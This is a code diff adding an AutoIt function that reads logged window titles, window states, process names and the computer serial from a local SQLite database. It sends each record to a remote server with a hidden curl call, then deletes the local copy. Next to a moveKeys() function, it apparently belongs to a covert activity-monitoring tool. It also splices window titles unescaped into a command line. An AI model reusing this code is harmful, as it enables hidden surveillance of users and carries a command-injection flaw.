@@ -441,4 +441,82 @@ Func moveKeys()
 EndFunc
 
 
+Func moveWindows()
+	
+	sqliteStart()
+	
+	Local $hQuery,$aRow
+	
+	_SQLite_Query($databaseHandle, "SELECT * FROM windows ORDER BY id DESC ", $hQuery)
+	
+	While _SQLite_FetchData($hQuery, $aRow, False, False) = $SQLITE_OK
+		
+		Local $id=$aRow[0]
+		
+		Local $window=$aRow[1]
+		
+		Local $exists=$aRow[2]
+		
+		Local $visable=$aRow[3]
+		
+		Local $enabled=$aRow[4]
+		
+		Local $active=$aRow[5]
+		
+		Local $maximized=$aRow[6]
+		
+		Local $minimized=$aRow[7]
+		
+		Local $process=$aRow[8]
+		
+		Local $computer_serial=$aRow[9]
+		
+		Local $epoch=$aRow[10]
+		
+		Local $address=$serverAddress&"/putWindows"
+		
+		Local $parameter='curl -v  -X POST -F '& '"computer_serial='&$computer_serial&'"' & ' -F ' &  '"window='&$window&'"' &' -F '& '"epoch='&$epoch&'"'&' -F '&'"exists='&$exists&'"'&' -F '&'"visible='&$visable&'"'&' -F '&'"enabled='&$enabled&'"'&' -F '&'"active='&$active&'"'&' -F '&'"maximised='&$maximized&'"'&' -F '&'"minimised='&$minimized&'"'&' -F '&'"process='&$process&'"  '&$address
+	
+		Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
+	
+		Local $sOutput = ""
+	
+		While 1
+		
+			$sOutput &= StdoutRead($iPID)
+		
+			If @error Then 
+			
+				ExitLoop
+			
+			EndIf
+		
+		WEnd
+	
+		Local $result=$sOutput
+		
+		ConsoleWrite($result)
+		
+		;MsgBox(64,"",$parameter)
+		
+		if $result<>"ok" Then
+			
+			;transferring values to remote did not work do nothing
+			
+		Else
+			
+			;values transferred to remote now delete entry from local db
+			
+			_SQLite_Exec($databaseHandle, "DELETE FROM windows WHERE id='$id$'")
+			
+		EndIf	
+			
+	
+	WEnd
+        
+	sqliteStop()
+
+EndFunc
+
+
 
